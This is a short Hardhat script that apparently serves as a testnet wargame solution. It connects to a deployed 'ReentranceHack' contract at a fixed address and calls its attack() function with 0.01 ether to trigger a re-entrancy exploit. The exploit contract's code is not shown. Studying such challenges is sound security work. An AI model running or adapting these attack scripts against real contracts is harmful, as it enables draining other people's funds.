const hre = require("hardhat");
const abi = require("../artifacts/contracts/ReentranceHack.sol/ReentranceHack.json");

async function main() {

    const [deployer] = await hre.ethers.getSigners();
    console.log("Attacking using MetaMask account:", deployer.address); 

    const contractAddress = "0x39c417512F6922843A9ed059616dF232cC6E7733"
    const contractABI = abi.abi;
    const reentranceHack = new hre.ethers.Contract(contractAddress, contractABI, deployer);

    const etherToSendWithAttack = hre.ethers.parseEther("0.01");

    const result = await reentranceHack.attack({ value: etherToSendWithAttack });
    await result.wait();

    console.log("Attack executed, transaction hash:", result.hash);
  }

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });


/*

Note: Can also get signer like this:

    const [deployer] = await hre.ethers.getSigners();   ===>

    const provider = new ethers.AlchemyProvider("sepolia", process.env.SEPOLIA_API_KEY);
    const signer = new hre.ethers.Wallet(process.env.PRIVATE_KEY, provider);

signer = deployer

*/